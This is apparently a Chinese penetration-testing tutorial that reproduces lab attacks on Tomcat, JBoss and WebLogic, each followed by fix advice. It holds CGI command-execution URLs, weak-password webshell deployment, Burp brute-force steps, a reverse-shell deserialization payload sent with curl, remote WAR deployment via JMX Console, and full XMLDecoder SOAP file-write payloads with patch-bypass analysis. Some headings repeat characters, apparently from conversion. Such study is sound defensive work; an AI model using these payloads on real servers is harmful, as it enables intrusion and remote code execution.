<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">&lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">&lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br><span class="line">&lt;init-param&gt;</span><br><span class="line">&lt;param-name&gt;executable&lt;/param-name&gt;</span><br><span class="line">&lt;param-value&gt;&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure>

<p>content.xml</p>
<p>在Tomcat\webapps\ROOT\WEB-INF新建cgi目录，并创建lxhsec.bat文件，内容任意。</p>
<p>访问<a href="http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&dir">http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;dir</a></p>
<p>执行命令<a href="http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&C:/WINDOWS/system32/net+user">http://127.0.0.1:8080/cgi-bin/lxhsec.bat?&amp;C:/WINDOWS/system32/net+user</a></p>
<p>Note:net命令的路径要写全，直接写net user，Tomcat控制台会提示net不是内部命令，也不是可运行的程序，另 必须使用+号连接，使用空格，%2B都会执<br>行失败，控制台报错。</p>
<p>修复建议修复建议</p>
<p>这个默认是关闭的，如果打开了请关闭，若需使用请升级版本。</p>
<h3 id="Tomcat-弱口令弱口令-amp-amp-后台后台-getshell-漏洞漏洞"><a href="#Tomcat-弱口令弱口令-amp-amp-后台后台-getshell-漏洞漏洞" class="headerlink" title="Tomcat + 弱口令弱口令 &amp;&amp; 后台后台 getshell 漏洞漏洞"></a>Tomcat + 弱口令弱口令 &amp;&amp; 后台后台 getshell 漏洞漏洞</h3><p>环境：Apache Tomcat&#x2F;7.0.94</p>
<p>在conf&#x2F;tomcat-users.xml文件中配置用户的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<p>正常安装的情况下，tomcat7.0.94中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
<p>访问 <a href="http://127.0.0.1:8080/manager/html">http://127.0.0.1:8080/manager/html</a> ,输入弱密码tomcat:tomcat，登陆后台。</p>
<p>生成war包：<br>jar -cvf lxhspy.war lxhspy.jsp</p>
<p>部署后，访问 <a href="http://127.0.0.1:8080/war%E5%8C%85%E5%90%8D/%E5%8C%85%E5%90%8D%E5%86%85%E6%96%87%E4%BB%B6%E5%90%8D">http://127.0.0.1:8080/war包名/包名内文件名</a>, 如下。</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 若无必要，取消manager/html功能。</span><br><span class="line">2. 若要使用，manager页面应只允许本地IP访问</span><br></pre></td></tr></table></figure>

<h3 id="Tomcat-manager-App-暴力破解暴力破解"><a href="#Tomcat-manager-App-暴力破解暴力破解" class="headerlink" title="Tomcat manager App 暴力破解暴力破解"></a>Tomcat manager App 暴力破解暴力破解</h3><p>环境：Apache Tomcat&#x2F;7.0.94</p>
<p>访问：<a href="http://127.0.0.1:8080/manager/html">http://127.0.0.1:8080/manager/html</a>, 输入密码，抓包，如下。</p>
<p>刚才输入的账号密码在HTTP字段中的Authorization中，规则为Base64Encode(user:passwd)<br>Authorization: Basic dG9tY2F0OmFkbWlu<br>解码之后如下：</p>
<p>将数据包发送到intruder模块，并标记dG9tY2F0OmFkbWlu。</p>
<p>Payload type选择 Custom iterator，设置三个position， 1 为用户字典， 2 为:， 3 为密码字典，并增加Payload Processing 为Base64-encode如下：</p>
<p>最后取消Palyload Encoding编码。</p>
<p>结果：</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 若无必要，取消manager/html功能。</span><br><span class="line">2. 若要使用，manager页面应只允许本地IP访问</span><br></pre></td></tr></table></figure>

<h2 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h2><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支<br>持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口:8080,9990</p>
<p>Windows下Jboss安装，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 下载http://jbossas.jboss.org/downloads/</span><br><span class="line">2. 解压，我这里解压后的目录为：C:\jboss-6.1.0.Final</span><br><span class="line">3. 新建环境变量：JBOSS_HOME 值为： C:\jboss-6.1.0.Final</span><br><span class="line">在path中加入：;%JBOSS_HOME%\bin;</span><br><span class="line">4. 打开C:\jboss-6.1.0.Final\bin 双击run.bat。出现info消息，即配置成功。</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> 注意注意 <strong>JDK</strong> 版本要在版本要在 <strong>1.6~1.7</strong> 之间，之间， <strong>1.8</strong> 版本版本 <strong>jBoss</strong> 运行打开运行打开 <strong>JMX Console</strong> 会出现会出现 <strong>500</strong> 错误。错误。</p>
<p>jboss默认部署路径：C:\jboss-6.1.0.Final\server\default\deploy\ROOT.war</p>
<p>设置外网访问，<br>将C:\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- A HTTP/1.1 Connector on port 8080 --&gt;</span><br><span class="line">&lt;Connector protocol=&quot;HTTP/1.1&quot; port=&quot;$&#123;jboss.web.http.port&#125;&quot; address=&quot;$&#123;jboss.bind.address&#125;&quot;</span><br><span class="line">redirectPort=&quot;$&#123;jboss.web.https.port&#125;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>将address&#x3D;”${jboss.bind.address}” 设置为address&#x3D;”0.0.0.0” ,并重启JBoss</p>
<h3 id="JBoss-5-x-x2F-6-x-反序列化漏洞（反序列化漏洞（-CVE-2017-12149-））"><a href="#JBoss-5-x-x2F-6-x-反序列化漏洞（反序列化漏洞（-CVE-2017-12149-））" class="headerlink" title="JBoss 5.x&#x2F;6.x 反序列化漏洞（反序列化漏洞（ CVE-2017-12149 ））"></a>JBoss 5.x&#x2F;6.x 反序列化漏洞（反序列化漏洞（ CVE-2017-12149 ））</h3><p>访问 &#x2F;invoker&#x2F;readonly</p>
<p>返回 500 ，说明页面存在，此页面存在反序列化漏洞。</p>
<p>利用工具:JavaDeserH2HC,我们选择一个Gadget：ReverseShellCommonsCollectionsHashMap，编译并生成序列化数据：</p>
<p>生成ReverseShellCommonsCollectionsHashMap.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure>

<p>生成ReverseShellCommonsCollectionsHashMap.ser</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.31.232:6666（ip是nc所在的ip）</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.31.205:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>

<h3 id="JBoss-JMXInvokerServlet-反序列化漏洞反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞反序列化漏洞</h3><p>访问 &#x2F;invoker&#x2F;JMXInvokerServlet</p>
<p>返回如下，说明接口开放，此接口存在反序列化漏洞。</p>
<p>这里直接利用CVE-2017-12149生成的ser，发送到&#x2F;invoker&#x2F;JMXInvokerServlet接口中。<br>如下：</p>
<h3 id="JBoss-EJBInvokerServlet-反序列化漏洞反序列化漏洞"><a href="#JBoss-EJBInvokerServlet-反序列化漏洞反序列化漏洞" class="headerlink" title="JBoss EJBInvokerServlet 反序列化漏洞反序列化漏洞"></a>JBoss EJBInvokerServlet 反序列化漏洞反序列化漏洞</h3><p>访问 &#x2F;invoker&#x2F;EJBInvokerServlet<br>返回如下，说明接口开放，此接口存在反序列化漏洞。</p>
<p>这里直接利用CVE-2017-12149生成的ser，发送到&#x2F;invoker&#x2F;EJBInvokerServlet接口中。<br>如下：</p>
<h4 id="修复建议修复建议"><a href="#修复建议修复建议" class="headerlink" title="修复建议修复建议"></a>修复建议修复建议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 不需要 http-invoker.sar 组件的用户可直接删除此组件。路径为：C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar,删除后访问404.</span><br><span class="line">2. 或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：</span><br><span class="line">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">路径为：C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br></pre></td></tr></table></figure>

<h3 id="JBoss-lt-x3D-4-x-JBossMQ-JMS-反序列化漏洞（反序列化漏洞（-CVE-2017-7504-））"><a href="#JBoss-lt-x3D-4-x-JBossMQ-JMS-反序列化漏洞（反序列化漏洞（-CVE-2017-7504-））" class="headerlink" title="JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞（反序列化漏洞（ CVE-2017-7504 ））"></a>JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞（反序列化漏洞（ CVE-2017-7504 ））</h3><p>环境:jboss-4.2.3</p>
<p>设置外网访问:<br>在C:\jboss-4.2.3\server\default\deploy\jboss-web.deployer\server.xml<br>将address&#x3D;”${jboss.bind.address} 改为：address&#x3D;”0.0.0.0”, 重启Jboss</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; address=&quot;$&#123;jboss.bind.address&#125;&quot;</span><br><span class="line">maxThreads=&quot;250&quot; maxHttpHeaderSize=&quot;8192&quot;</span><br><span class="line">emptySessionPath=&quot;true&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">enableLookups=&quot;false&quot; redirectPort=&quot;8443&quot; acceptCount=&quot;100&quot;</span><br><span class="line">connectionTimeout=&quot;20000&quot; disableUploadTimeout=&quot;true&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet，<br>返回This is the JBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞。</p>
<p>这里直接利用CVE-2017-12149生成的ser，发送到&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet接口中。<br>如下：</p>
<p>修复建议修复建议</p>
<p>升级至最新版。</p>
<h3 id="Administration-Console-弱口令弱口令"><a href="#Administration-Console-弱口令弱口令" class="headerlink" title="Administration Console 弱口令弱口令"></a>Administration Console 弱口令弱口令</h3><p>Administration Console管理页面存在弱口令，admin:admin，登陆后台上传war包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 点击Web Application (WAR)s</span><br><span class="line">2. Add a new resource，上传war包</span><br><span class="line">3. 点击创建的war包进入下一层，若状态为stop，点击Start按钮（默认都是start状态，不需要点击Start按钮）</span><br><span class="line">4. 访问。</span><br><span class="line">http://xx.xx.xx.xx/[warname]/shellname.jsp</span><br></pre></td></tr></table></figure>

<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 修改密码</span><br><span class="line">C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">2. 或删除Administration Console页面。</span><br><span class="line">JBoss版本&gt;=6.0，admin-console页面路径为： C:\jboss-6.1.0.Final\common\deploy\admin-console.war</span><br><span class="line">6.0之前的版本，路径为C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war</span><br></pre></td></tr></table></figure>

<h3 id="JMX-Console-未授权访问未授权访问"><a href="#JMX-Console-未授权访问未授权访问" class="headerlink" title="JMX Console 未授权访问未授权访问"></a>JMX Console 未授权访问未授权访问</h3><p>JMX Console默认存在未授权访问，直接点击JBoss主页中的JMX Console链接进入JMX Console页面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在JMX Console页面点击jboss.system链接，在Jboss.system页面中点击service=MainDeployer，如下</span><br><span class="line">2. 进入service=MainDeployer页面之后，找到methodIndex为17 or 19的deploy 填写远程war包地址进行远程部署。</span><br><span class="line">3. 这里我部署的war包为lxh.war，链接如下：</span><br><span class="line">http://192.168.31.205:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://192.168.31.205/lxh.war</span><br><span class="line">4. 访问</span><br><span class="line">http://xx.xx.xx.xx/[warname]/shellname.jsp</span><br></pre></td></tr></table></figure>

<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 增加密码措施，防止未授权访问。</span><br><span class="line">1 ）在C:\jboss-6.1.0.Final\common\deploy\jmx-console.war\WEB-INF\jboss-web.xml开启安全配置。</span><br><span class="line">2 ）在C:\jboss-6.1.0.Final\common\deploy\jmx-console.war\WEB-INF\web.xml开启安全认证。</span><br><span class="line">3 ）在C:\jboss-6.1.0.Final\server\default\conf\login-config.xml中可以看到JMX Console的用户密码配置位置。</span><br><span class="line">&lt;application-policy name=&quot;jmx-console&quot;&gt;</span><br><span class="line">&lt;authentication&gt;</span><br><span class="line">&lt;login-module code=&quot;org.jboss.security.auth.spi.UsersRolesLoginModule&quot;</span><br><span class="line">flag=&quot;required&quot;&gt;</span><br><span class="line">&lt;module-option name=&quot;usersProperties&quot;&gt;props/jmx-console-users.properties&lt;/module-option&gt;</span><br><span class="line">&lt;module-option name=&quot;rolesProperties&quot;&gt;props/jmx-console-roles.properties&lt;/module-option&gt;</span><br><span class="line">&lt;/login-module&gt;</span><br><span class="line">&lt;/authentication&gt;</span><br><span class="line">4 ）配置用户密码以及用户权限，这里新增lxhsec用户。</span><br><span class="line">5 ）重启JBoss，效果如下：</span><br></pre></td></tr></table></figure>

<p>2.或删除JMX Console,后重启JBoss</p>
<p>C:\jboss-6.1.0.Final\common\deploy\jmx-console.war</p>
<h2 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h2><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布<br>式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之<br>中。</p>
<p>默认端口:7001</p>
<p>测试环境版本：10.3.6<br>下载地址：<a href="https://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_win32.exe">https://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_win32.exe</a>?<br>AuthParam&#x3D;1559386164_88cf328d83f60337f08c2c94ee292954</p>
<p>下载完成后双击运行，一直点下一步就ok了。</p>
<p>安装完成之后，在C:\Oracle\Middleware\user_projects\domains\base_domain这个目录双击startWebLogic.cmd启动Weblogic服务。</p>
<p>浏览器访问：<a href="http://127.0.0.1:7001/">http://127.0.0.1:7001/</a>, 界面上出现Error 404–Not Found，即启动成功。</p>
<p>设置外网访问，在 域结构 -&gt; 环境 -&gt; 服务器<br>右边选择相应的Server（管理服务器），打开进行编辑，在监听地址:中填入0.0.0.0，保存后，重启Weblogic服务器即可。</p>
<p>以下复现若无特别说明均采用Weblogic 10.3.6</p>
<h3 id="XMLDecoder-反序列化漏洞（反序列化漏洞（-CVE-2017-10271-amp-CVE-2017-3506-））"><a href="#XMLDecoder-反序列化漏洞（反序列化漏洞（-CVE-2017-10271-amp-CVE-2017-3506-））" class="headerlink" title="XMLDecoder 反序列化漏洞（反序列化漏洞（ CVE-2017-10271 &amp; CVE-2017-3506 ））"></a>XMLDecoder 反序列化漏洞（反序列化漏洞（ CVE-2017-10271 &amp; CVE-2017-3506 ））</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可<br>执行任意命令。</p>
<p>访问 &#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>返回如下页面，则可能存在此漏洞。</p>
<p>漏洞不仅存在于 &#x2F;wls-wsat&#x2F;CoordinatorPortType 。<br>只要是在wls-wsat包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径<br>为：C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml</p>
<p>默认受到影响的Uri如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>构造 写入文件 数据包发送，如下，其中Content-Type需要等于text&#x2F;xml,否则可能导致XMLDecoder不解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 629</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test777776666666&quot;); %&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>访问 &#x2F;bea_wls_internal&#x2F;test2.jsp,如下：</p>
<p>不熟悉JAVA的小伙伴们可能会对这个构造的XML有所疑惑，可以参考下这篇文章。</p>
<p>CVE-2017-3506的补丁加了验证函数，补丁在weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkContextXmlInputAdapter.java中添加了validate方法, 验证Payload中的节点是否<br>存在object Tag。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is)&#123;</span><br><span class="line">WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();</span><br><span class="line">try &#123;</span><br><span class="line">SAXParser parser =factory.newSAXParser();</span><br><span class="line">parser.parse(is, newDefaultHandler() &#123;</span><br><span class="line">public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid context type: object&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; catch(ParserConfigurationException var5) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Parser Exception&quot;, var5);</span><br><span class="line">&#125; catch (SAXExceptionvar6) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Parser Exception&quot;, var6);</span><br><span class="line">&#125; catch (IOExceptionvar7) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Parser Exception&quot;, var7);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将object换成void就可绕过此补丁，产生了CVE-2017-10271。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;void class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test777776666666&quot;); %&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>修复建议修复建议</p>
<p>1 ）安装补丁。<br>2 ）或删除wls-wsat组件，再次访问返回404.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war</span><br><span class="line">2.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\.internal\wls-wsat.war</span><br><span class="line">3.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat</span><br><span class="line">4.重启Weblogic</span><br></pre></td></tr></table></figure>

<p>Note：wls-wsat.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</p>
<h3 id="Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（-CVE-2019"><a href="#Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（-CVE-2019" class="headerlink" title="Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（ CVE-2019-"></a>Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（ CVE-2019-</h3><h3 id="2725-））"><a href="#2725-））" class="headerlink" title="2725 ））"></a>2725 ））</h3><p>影响组件：bea_wls9_async_response.war, wls-wsat.war<br>影响版本：10.3.6.0, 12.1.3.0</p>
<h5 id="bea-wls9-async-response-war"><a href="#bea-wls9-async-response-war" class="headerlink" title="bea_wls9_async_response.war"></a>bea_wls9_async_response.war</h5><p>访问 &#x2F;_async&#x2F;AsyncResponseService<br>返回如下页面，则可能存在此漏洞。</p>
<p>漏洞不仅存在于 &#x2F;_async&#x2F;AsyncResponseService<br>只要是在bea_wls9_async_response包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：<br>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml</p>
<p>默认受到影响的Uri如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br></pre></td></tr></table></figure>

<p>wls-wsat.war受影响的URI见XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506）</p>
<p>此漏洞实际上是CVE-2017-10271的又一入口，那么它是怎么绕过CVE-2017-10271的补丁，执行REC的呢。</p>
<p>先来看一下CVE-2017-10271的补丁代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void startElement(String uri, String localName, String qName, Attributesattributes)throws SAXException &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</span><br><span class="line">for(int attClass = 0; attClass &lt; attributes.getLength();++attClass) &#123;</span><br><span class="line">if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass)))&#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid attribute for elementvoid:&quot; + attributes.getQName(attClass));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">String var9 =attributes.getValue(&quot;class&quot;);</span><br><span class="line">if(var9 != null &amp;&amp;!var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;The value of class attribute is notvalid for array element.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是<br>必须要是byte类型的。<br>绕过CVE-2017-10271补丁是因为class标签未被过滤所导致的，这点我们可以从Oracle 发布的CVE-2019-2725补丁看出来，<br>CVE-2019-2725补丁新增部分内容，将class加入了黑名单，限制了array标签中的byte长度。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if (qName.equalsIgnoreCase(&quot;class&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:class&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">String attClass = attributes.getValue(&quot;class&quot;);</span><br><span class="line">if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">String lengthString = attributes.getValue(&quot;length&quot;);</span><br><span class="line">if (lengthString != null) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">int length = Integer.valueOf(lengthString);</span><br><span class="line">if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Exceed array length limitation&quot;);</span><br><span class="line">&#125;</span><br><span class="line">this.overallarraylength += length;</span><br><span class="line">if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Exceed over all array limitation.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch (NumberFormatException var8) &#123;</span><br></pre></td></tr></table></figure>

<p>复现：</p>
<h6 id="Weblogic-10-3-6-利用利用-oracle-toplink-internal-sessions-UnitOfWorkChangeSet-构造函数执行构造函数执行-readObject"><a href="#Weblogic-10-3-6-利用利用-oracle-toplink-internal-sessions-UnitOfWorkChangeSet-构造函数执行构造函数执行-readObject" class="headerlink" title="Weblogic 10.3.6 利用利用 oracle.toplink.internal.sessions.UnitOfWorkChangeSet 构造函数执行构造函数执行 readObject()."></a>Weblogic 10.3.6 利用利用 oracle.toplink.internal.sessions.UnitOfWorkChangeSet 构造函数执行构造函数执行 readObject().</h6><p>构造函数参考</p>
